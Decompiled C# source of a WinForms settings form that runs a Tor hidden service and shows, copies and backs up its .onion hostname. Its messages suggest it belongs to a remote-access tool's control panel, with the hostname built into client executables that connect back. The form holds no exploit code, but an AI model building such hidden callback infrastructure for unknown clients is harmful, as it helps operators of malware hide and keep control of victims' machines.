﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x0200013D RID: 317
[DesignerGenerated]
public sealed partial class fTorConfig : Form
{
	// Token: 0x060011A8 RID: 4520 RVA: 0x00009E56 File Offset: 0x00008056
	public fTorConfig()
	{
		base.Load += this.fTorConfig_Load;
		base.Closing += this.fTorConfig_Closing;
		this.InitializeComponent();
	}

	// Token: 0x060011AB RID: 4523 RVA: 0x00009E88 File Offset: 0x00008088
	internal CheckBox vmethod_0()
	{
		return this.checkBox_0;
	}

	// Token: 0x060011AC RID: 4524 RVA: 0x00009E90 File Offset: 0x00008090
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(CheckBox checkBox_1)
	{
		this.checkBox_0 = checkBox_1;
	}

	// Token: 0x060011AD RID: 4525 RVA: 0x00009E99 File Offset: 0x00008099
	internal System.Windows.Forms.Timer vmethod_2()
	{
		return this.timer_0;
	}

	// Token: 0x060011AE RID: 4526 RVA: 0x0008214C File Offset: 0x0008034C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_5);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_2;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x060011AF RID: 4527 RVA: 0x00009EA1 File Offset: 0x000080A1
	internal StatusStrip vmethod_4()
	{
		return this.statusStrip_0;
	}

	// Token: 0x060011B0 RID: 4528 RVA: 0x00009EA9 File Offset: 0x000080A9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x060011B1 RID: 4529 RVA: 0x00009EB2 File Offset: 0x000080B2
	internal ToolStripStatusLabel vmethod_6()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x060011B2 RID: 4530 RVA: 0x00009EBA File Offset: 0x000080BA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ToolStripStatusLabel toolStripStatusLabel_1)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_1;
	}

	// Token: 0x060011B3 RID: 4531 RVA: 0x00009EC3 File Offset: 0x000080C3
	internal PictureBox vmethod_8()
	{
		return this.pictureBox_0;
	}

	// Token: 0x060011B4 RID: 4532 RVA: 0x00082190 File Offset: 0x00080390
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(PictureBox pictureBox_5)
	{
		EventHandler value = new EventHandler(this.method_6);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_5;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x060011B5 RID: 4533 RVA: 0x00009ECB File Offset: 0x000080CB
	internal TextBox vmethod_10()
	{
		return this.textBox_0;
	}

	// Token: 0x060011B6 RID: 4534 RVA: 0x000821D4 File Offset: 0x000803D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(TextBox textBox_2)
	{
		EventHandler value = new EventHandler(this.method_7);
		KeyPressEventHandler value2 = new KeyPressEventHandler(this.method_8);
		TextBox textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
			textBox.KeyPress -= value2;
		}
		this.textBox_0 = textBox_2;
		textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged += value;
			textBox.KeyPress += value2;
		}
	}

	// Token: 0x060011B7 RID: 4535 RVA: 0x00009ED3 File Offset: 0x000080D3
	internal Label vmethod_12()
	{
		return this.label_0;
	}

	// Token: 0x060011B8 RID: 4536 RVA: 0x00009EDB File Offset: 0x000080DB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(Label label_2)
	{
		this.label_0 = label_2;
	}

	// Token: 0x060011B9 RID: 4537 RVA: 0x00009EE4 File Offset: 0x000080E4
	internal Label vmethod_14()
	{
		return this.label_1;
	}

	// Token: 0x060011BA RID: 4538 RVA: 0x00009EEC File Offset: 0x000080EC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(Label label_2)
	{
		this.label_1 = label_2;
	}

	// Token: 0x060011BB RID: 4539 RVA: 0x00009EF5 File Offset: 0x000080F5
	internal PictureBox vmethod_16()
	{
		return this.pictureBox_1;
	}

	// Token: 0x060011BC RID: 4540 RVA: 0x00082234 File Offset: 0x00080434
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(PictureBox pictureBox_5)
	{
		EventHandler value = new EventHandler(this.method_9);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_5;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x060011BD RID: 4541 RVA: 0x00009EFD File Offset: 0x000080FD
	internal TextBox vmethod_18()
	{
		return this.textBox_1;
	}

	// Token: 0x060011BE RID: 4542 RVA: 0x00009F05 File Offset: 0x00008105
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(TextBox textBox_2)
	{
		this.textBox_1 = textBox_2;
	}

	// Token: 0x060011BF RID: 4543 RVA: 0x00009F0E File Offset: 0x0000810E
	internal BackgroundWorker vmethod_20()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x060011C0 RID: 4544 RVA: 0x00082278 File Offset: 0x00080478
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(BackgroundWorker backgroundWorker_1)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_10);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_1;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x060011C1 RID: 4545 RVA: 0x00009F16 File Offset: 0x00008116
	internal VisualButton vmethod_22()
	{
		return this.visualButton_0;
	}

	// Token: 0x060011C2 RID: 4546 RVA: 0x000822BC File Offset: 0x000804BC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(VisualButton visualButton_3)
	{
		EventHandler value = new EventHandler(this.method_11);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_3;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060011C3 RID: 4547 RVA: 0x00009F1E File Offset: 0x0000811E
	internal VisualButton vmethod_24()
	{
		return this.visualButton_1;
	}

	// Token: 0x060011C4 RID: 4548 RVA: 0x00082300 File Offset: 0x00080500
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(VisualButton visualButton_3)
	{
		EventHandler value = new EventHandler(this.method_13);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_3;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060011C5 RID: 4549 RVA: 0x00009F26 File Offset: 0x00008126
	internal PictureBox vmethod_26()
	{
		return this.pictureBox_2;
	}

	// Token: 0x060011C6 RID: 4550 RVA: 0x00009F2E File Offset: 0x0000812E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(PictureBox pictureBox_5)
	{
		this.pictureBox_2 = pictureBox_5;
	}

	// Token: 0x060011C7 RID: 4551 RVA: 0x00009F37 File Offset: 0x00008137
	internal PictureBox vmethod_28()
	{
		return this.pictureBox_3;
	}

	// Token: 0x060011C8 RID: 4552 RVA: 0x00082344 File Offset: 0x00080544
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(PictureBox pictureBox_5)
	{
		EventHandler value = new EventHandler(this.method_14);
		PictureBox pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_3 = pictureBox_5;
		pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x060011C9 RID: 4553 RVA: 0x00009F3F File Offset: 0x0000813F
	internal VisualButton vmethod_30()
	{
		return this.visualButton_2;
	}

	// Token: 0x060011CA RID: 4554 RVA: 0x00082388 File Offset: 0x00080588
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(VisualButton visualButton_3)
	{
		EventHandler value = new EventHandler(this.method_15);
		VisualButton visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_2 = visualButton_3;
		visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060011CB RID: 4555 RVA: 0x00009F47 File Offset: 0x00008147
	internal System.Windows.Forms.Timer vmethod_32()
	{
		return this.timer_1;
	}

	// Token: 0x060011CC RID: 4556 RVA: 0x000823CC File Offset: 0x000805CC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_16);
		System.Windows.Forms.Timer timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_1 = timer_2;
		timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x060011CD RID: 4557 RVA: 0x00009F4F File Offset: 0x0000814F
	internal PictureBox vmethod_34()
	{
		return this.pictureBox_4;
	}

	// Token: 0x060011CE RID: 4558 RVA: 0x00082410 File Offset: 0x00080610
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(PictureBox pictureBox_5)
	{
		EventHandler value = new EventHandler(this.method_17);
		PictureBox pictureBox = this.pictureBox_4;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_4 = pictureBox_5;
		pictureBox = this.pictureBox_4;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x060011CF RID: 4559 RVA: 0x00009F57 File Offset: 0x00008157
	public void method_0(Form form_0)
	{
		this.fMain_0 = (fMain)form_0;
	}

	// Token: 0x060011D0 RID: 4560 RVA: 0x00082454 File Offset: 0x00080654
	public void method_1()
	{
		this.vmethod_10().Text = Class135.smethod_0().TorConfigUsername;
		this.vmethod_0().Checked = Class135.smethod_0().TorConfigAutostart;
		this.vmethod_18().ReadOnly = true;
		if (File.Exists(Application.StartupPath + "\\data\\tor\\html\\hostname"))
		{
			TextBox textBox = this.vmethod_18();
			string text = Application.StartupPath + "\\data\\tor\\html\\hostname";
			textBox.Text = Strings.Replace(Class136.smethod_14(ref text), "\r\n", string.Empty, 1, -1, CompareMethod.Text);
			this.vmethod_18().Enabled = true;
			this.vmethod_28().Enabled = true;
		}
		if (!Class130.struct18_5.method_0())
		{
			Class130.struct18_5.method_1(true);
			if (this.vmethod_0().Checked)
			{
				Class136.smethod_12();
			}
		}
	}

	// Token: 0x060011D1 RID: 4561 RVA: 0x00082524 File Offset: 0x00080724
	public void method_2(string string_0, bool bool_2)
	{
		if (this.vmethod_4().InvokeRequired)
		{
			this.vmethod_4().Invoke(new fTorConfig.Delegate101(this.method_2), new object[]
			{
				string_0,
				bool_2
			});
			return;
		}
		try
		{
			this.vmethod_6().Text = "Status: " + string_0;
			ToolStripItem toolStripItem = this.vmethod_6();
			object obj = Interaction.IIf(bool_2, Color.Red, Color.Black);
			toolStripItem.ForeColor = ((obj != null) ? ((Color)obj) : default(Color));
			if (bool_2)
			{
				this.vmethod_10().Enabled = true;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060011D2 RID: 4562 RVA: 0x000825E8 File Offset: 0x000807E8
	public void method_3(string string_0)
	{
		if (this.vmethod_22().InvokeRequired)
		{
			this.vmethod_22().Invoke(new fTorConfig.Delegate102(this.method_3), new object[]
			{
				string_0
			});
			return;
		}
		try
		{
			this.vmethod_22().Text = string_0;
			this.vmethod_22().Refresh();
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060011D3 RID: 4563 RVA: 0x00009F65 File Offset: 0x00008165
	private void fTorConfig_Load(object sender, EventArgs e)
	{
		this.method_4();
		this.method_1();
	}

	// Token: 0x060011D4 RID: 4564 RVA: 0x00063178 File Offset: 0x00061378
	public void method_4()
	{
		checked
		{
			base.Left = (int)Math.Round(unchecked((double)Class130.fMain_0.Left + (double)Class130.fMain_0.Width / 2.0 - (double)base.Width / 2.0));
			base.Top = (int)Math.Round(unchecked((double)Class130.fMain_0.Top + (double)Class130.fMain_0.Height / 2.0 - (double)base.Height / 2.0));
		}
	}

	// Token: 0x060011D5 RID: 4565 RVA: 0x0008265C File Offset: 0x0008085C
	private void method_5(object sender, EventArgs e)
	{
		if (!Directory.Exists(Application.StartupPath + "\\data\\tor\\"))
		{
			this.bool_0 = false;
			this.method_2("Tor directory missing!", true);
			return;
		}
		if (!File.Exists(Application.StartupPath + "\\data\\tor\\tor.exe"))
		{
			this.bool_0 = false;
			this.method_2("Tor executable (tor.exe) missing!", true);
		}
	}

	// Token: 0x060011D6 RID: 4566 RVA: 0x00009F73 File Offset: 0x00008173
	private void method_6(object sender, EventArgs e)
	{
		Interaction.MsgBox("A handle for your Hidden tor service, so user don't have to refer to it by key. The nickname is optional!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x060011D7 RID: 4567 RVA: 0x000826BC File Offset: 0x000808BC
	private void method_7(object sender, EventArgs e)
	{
		if (this.vmethod_10().TextLength <= 0)
		{
			if (this.vmethod_10().TextLength == 0)
			{
				this.vmethod_10().BackColor = Color.White;
			}
			return;
		}
		if (this.vmethod_10().TextLength < 3)
		{
			this.vmethod_10().BackColor = Color.Red;
			return;
		}
		this.vmethod_10().BackColor = Color.White;
	}

	// Token: 0x060011D8 RID: 4568 RVA: 0x00009F87 File Offset: 0x00008187
	private void method_8(object sender, KeyPressEventArgs e)
	{
		if (!((e.KeyChar > '0' & e.KeyChar < '[') | (e.KeyChar > '`' & e.KeyChar < '{') | e.KeyChar == '\b'))
		{
			e.KeyChar = '\0';
		}
	}

	// Token: 0x060011D9 RID: 4569 RVA: 0x00009FC7 File Offset: 0x000081C7
	private void method_9(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_18().Text, "N/A", true) == 0)
		{
			Interaction.MsgBox("The hostname is your private DNS and is to be used when building your .exe\r\n\r\nYour hostname will be generated and displayed once you start the Tor hidden service.", MsgBoxStyle.Information, Application.ProductName);
			return;
		}
		Interaction.MsgBox("The hostname is your private DNS and is to be used when building your .exe", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x060011DA RID: 4570 RVA: 0x00007348 File Offset: 0x00005548
	private void fTorConfig_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x060011DB RID: 4571 RVA: 0x00082724 File Offset: 0x00080924
	private void method_10(object sender, DoWorkEventArgs e)
	{
		while (!Class130.process_0.HasExited)
		{
			Thread.Sleep(10);
		}
		Class130.struct18_3.method_1(false);
		if (this.bool_1)
		{
			this.method_2("Tor hidden service was stopped!", false);
		}
		else
		{
			this.method_2("Tor hidden service failed to launch. Tor already running?", true);
		}
		this.method_3("Start");
	}

	// Token: 0x060011DC RID: 4572 RVA: 0x00082780 File Offset: 0x00080980
	private void method_11(object sender, EventArgs e)
	{
		if (Class130.struct18_3.method_0())
		{
			if (MessageBox.Show("Are you sure you want to stop the Tor hidden service?\r\nWarning: Connected clients via Tor will be immediately disconnected.", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				this.method_2("Stopping Tor hidden service. Please wait...", false);
				this.bool_1 = true;
				this.vmethod_10().Enabled = true;
				if (Class130.process_0 != null && !Class130.process_0.HasExited)
				{
					Class130.process_0.Kill();
				}
			}
			return;
		}
		if (this.vmethod_10().TextLength > 0 && this.vmethod_10().TextLength < 3)
		{
			Interaction.MsgBox("Invalid username! Username must be between 3 to 20 characters in lenght.", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		Class135.smethod_0().TorConfigUsername = this.vmethod_10().Text;
		Class135.smethod_0().TorConfigAutostart = this.vmethod_0().Checked;
		Class135.smethod_0().Save();
		Class136.smethod_12();
	}

	// Token: 0x060011DD RID: 4573 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_12(object sender, EventArgs e)
	{
	}

	// Token: 0x060011DE RID: 4574 RVA: 0x00082854 File Offset: 0x00080A54
	private void method_13(object sender, EventArgs e)
	{
		if (this.vmethod_10().TextLength > 0 && this.vmethod_10().TextLength < 3)
		{
			Interaction.MsgBox("Invalid username! Username must be between 3 to 20 characters in lenght.", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		try
		{
			Class135.smethod_0().TorConfigUsername = this.vmethod_10().Text;
			Class135.smethod_0().TorConfigAutostart = this.vmethod_0().Checked;
			Class135.smethod_0().Save();
		}
		catch (Exception ex)
		{
			Interaction.MsgBox("Error while saving settings!\r\nError: " + ex.Message, MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x060011DF RID: 4575 RVA: 0x00082914 File Offset: 0x00080B14
	private void method_14(object sender, EventArgs e)
	{
		try
		{
			Clipboard.Clear();
			Clipboard.SetText(this.vmethod_18().Text);
			Interaction.MsgBox("Hostname copied to clipboard!", MsgBoxStyle.Information, Application.ProductName);
		}
		catch (Exception ex)
		{
			Interaction.MsgBox("Failed while copying hostname to clipboard!\r\nError: " + ex.Message, MsgBoxStyle.Critical, Application.ProductName);
		}
	}

	// Token: 0x060011E0 RID: 4576 RVA: 0x00082988 File Offset: 0x00080B88
	private void method_15(object sender, EventArgs e)
	{
		try
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "ZIP Archive |*.zip";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ZipFile.CreateFromDirectory(Application.StartupPath + "\\data\\tor\\html", saveFileDialog.FileName, CompressionLevel.Optimal, false);
				Interaction.MsgBox("Backup successfully saved to: " + saveFileDialog.FileName, MsgBoxStyle.Information, Application.ProductName);
			}
			else
			{
				Interaction.MsgBox("Backup was aborted by user!", MsgBoxStyle.Critical, Application.ProductName);
			}
		}
		catch (Exception ex)
		{
			Interaction.MsgBox("Error occured while backing up hidden service address! (Error: " + ex.Message + ")", MsgBoxStyle.Critical, Application.ProductName);
		}
	}

	// Token: 0x060011E1 RID: 4577 RVA: 0x0000A006 File Offset: 0x00008206
	private void method_16(object sender, EventArgs e)
	{
		this.vmethod_30().Enabled = Directory.Exists(Application.StartupPath + "\\data\\tor\\html");
		this.vmethod_34().Enabled = Directory.Exists(Application.StartupPath + "\\data\\tor\\html");
	}

	// Token: 0x060011E2 RID: 4578 RVA: 0x00082A40 File Offset: 0x00080C40
	private void method_17(object sender, EventArgs e)
	{
		Interaction.MsgBox(string.Concat(new string[]
		{
			"You are strongly advised to backup your hidden service address (.onion addres) which is stored in: ",
			Application.StartupPath,
			"\\data\\tor\\html in case you lose access to ",
			Application.ProductName,
			", unexpected corruption, wish to move it to another system or simply after a new major update.\r\n\r\nBy default, an update should not interfere with your existing hidden service address, but losing your .onion address will result in loss of all clients connecting to it.\r\n\r\nYou can either manually copy the data\\tor\\html folder or simply click Backup to create a ZIP-Archive of it.\r\n\r\nTo restore a hidden service address, delete the contents inside the data\\tor\\html folder, place the backed up files in it and restart ",
			Application.ProductName
		}), MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x040006F2 RID: 1778
	private CheckBox checkBox_0;

	// Token: 0x040006F3 RID: 1779
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040006F4 RID: 1780
	private StatusStrip statusStrip_0;

	// Token: 0x040006F5 RID: 1781
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x040006F6 RID: 1782
	private PictureBox pictureBox_0;

	// Token: 0x040006F7 RID: 1783
	private TextBox textBox_0;

	// Token: 0x040006F8 RID: 1784
	private Label label_0;

	// Token: 0x040006F9 RID: 1785
	private Label label_1;

	// Token: 0x040006FA RID: 1786
	private PictureBox pictureBox_1;

	// Token: 0x040006FB RID: 1787
	private TextBox textBox_1;

	// Token: 0x040006FC RID: 1788
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040006FD RID: 1789
	private VisualButton visualButton_0;

	// Token: 0x040006FE RID: 1790
	private VisualButton visualButton_1;

	// Token: 0x040006FF RID: 1791
	private PictureBox pictureBox_2;

	// Token: 0x04000700 RID: 1792
	private PictureBox pictureBox_3;

	// Token: 0x04000701 RID: 1793
	private VisualButton visualButton_2;

	// Token: 0x04000702 RID: 1794
	private System.Windows.Forms.Timer timer_1;

	// Token: 0x04000703 RID: 1795
	private PictureBox pictureBox_4;

	// Token: 0x04000704 RID: 1796
	private fMain fMain_0;

	// Token: 0x04000705 RID: 1797
	private bool bool_0;

	// Token: 0x04000706 RID: 1798
	private bool bool_1;

	// Token: 0x0200013E RID: 318
	// (Invoke) Token: 0x060011E6 RID: 4582
	private delegate void Delegate101(string string_0, bool bool_0);

	// Token: 0x0200013F RID: 319
	// (Invoke) Token: 0x060011EA RID: 4586
	private delegate void Delegate102(string string_0);
}
